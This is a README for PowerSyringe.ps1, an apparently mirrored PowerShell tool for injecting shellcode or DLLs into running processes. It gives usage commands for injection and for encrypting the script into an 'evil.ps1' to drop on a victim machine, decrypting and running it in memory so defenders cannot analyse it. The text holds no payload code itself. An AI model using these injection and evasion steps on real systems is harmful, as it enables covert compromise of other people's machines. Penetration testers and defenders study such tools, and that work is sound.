# PowerSyringe.ps1

Code was downloaded and imported here. All credit goes to Matthew Graeber. This project is licensed under a Creative Commons Attribution 3.0 Unported License.

http://www.exploit-monday.com/2011/11/powersyringe-powershell-based-codedll.html

----

Here is a rundown of its features:

* Shellcode injection from within Powershell
* Shellcode injection into any 32 or 64-bit process
* DLL injection into any 32 or 64-bit process
* Encryption - The script can encrypt itself and outputs the encrypted version to .\evil.ps1. This will make analysis of the script impossible/improbable without the correct password and salt (or if they happen to perform live memory forensics). >D
* Decryption - evil.ps1 will decrypt itself back into its original form if you provide the right password and salt
* Doesn't flag DEP b/c it doesn't execute in the stack
* Fairly detailed documentation

----

##Example  
Here is an excerpt of the documentation with usage examples:

**DLL Injection**
C:\PS>PowerSyringe 1 4274 .\evil.dll

**Description**
Inject 'evil.dll' into process ID 4274.

**Inject shellcode into process**
C:\PS>PowerSyringe 2 4274

**Description**
Inject the shellcode as defined in the script into process ID 4274

**Execute shellcode within the context of PowerShell**
C:\PS>PowerSyringe 3

**Description**
Execute the shellcode as defined in the script within the context of Powershell.

**Encrypt the script with the password:'password' and salt:'salty'**
C:\PS>PowerSyringe 4 .\PowerSyringe.ps1 password salty

**Description**
Encrypt the contents of this file with a password and salt. This will make analysis of the script impossible without the correct password and salt combination. This command will generate evil.ps1 that can dropped onto the victim machine. It only consists of a decryption function 'de' and the base64-encoded ciphertext.

*Note: This command can be used to encrypt any text-based file/script*

**Decrypt encrypted script and execute it in memory**
C:\PS>[String] $cmd = Get-Content .\evil.ps1
C:\PS>Invoke-Expression $cmd
C:\PS>$decrypted = de password salt
C:\PS>Invoke-Expression $decrypted

**Description**
After you run the encryption option and generate evil.ps1 these commands will decrypt and execute
(i.e. define the function) PowerSyringe entirely in memory assuming you provided the proper password and salt combination.

Upon successful completion of these commands, you can execute PowerSyringe as normal.

Note: "Invoke-Expression $decrypted" may generate an error. Just ignore it. PowerSyringe will
still work.
